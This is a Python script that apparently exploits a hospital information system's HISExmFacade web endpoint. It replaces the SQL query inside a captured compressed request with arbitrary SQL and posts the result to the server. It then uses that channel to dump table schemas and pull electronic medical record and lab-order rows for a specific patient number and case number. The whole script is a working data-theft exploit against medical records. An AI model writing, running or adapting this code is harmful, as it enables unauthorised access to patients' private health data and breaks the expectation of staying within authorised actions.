from his_client_final import HISClient
import requests
import zlib
import re

class Helper(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = Helper()
hhisnum = '003617083J'
caseno = '75176986'

# 1. Check EMR.LABREC_M/D
# Dump schema first to see keys
print("Checking EMR.LABREC_M schema...")
q = "SELECT * FROM EMR.LABREC_M WHERE ROWNUM <= 1"
res = hunter.execute_sql(q)
if res and "<NewDataSet>" in res:
    cols = re.findall(r'<xs:element name="(.*?)"', res)
    print(f"Columns: {cols[:50]}")
    
    # Try querying if likely keys exist
    if "HHISNUM" in str(cols):
        print("Querying EMR.LABREC_M by HHISNUM...")
        q2 = f"SELECT * FROM EMR.LABREC_M WHERE HHISNUM = '{hhisnum}'"
        r2 = hunter.execute_sql(q2)
        if r2 and "<NewDataSet>" in r2:
            print("!!! FOUND EMR DATA !!!")
            print(r2[:2000])

# 2. Check CPOE.ORDLAB
print("\nChecking CPOE.ORDLAB partial CASENO...")
q_ord = f"SELECT * FROM CPOE.ORDLAB WHERE UDOCASORSEQ LIKE '%{caseno}%'"
r_ord = hunter.execute_sql(q_ord)
if r_ord and "<NewDataSet>" in r_ord:
    print("!!! FOUND CPOE.ORDLAB DATA !!!")
    print(r_ord[:2000])

# 3. Sample OPDUSR.LABIHED
print("\nSampling OPDUSR.LABIHED...")
q_lab = "SELECT * FROM OPDUSR.LABIHED WHERE ROWNUM <= 1"
r_lab = hunter.execute_sql(q_lab)
if r_lab and "<NewDataSet>" in r_lab:
     print("!!! SAMPLE OPDUSR.LABIHED !!!")
     print(r_lab[:2000]) # Check actual row data if exists
else:
     print("[-] OPDUSR.LABIHED appears empty.")

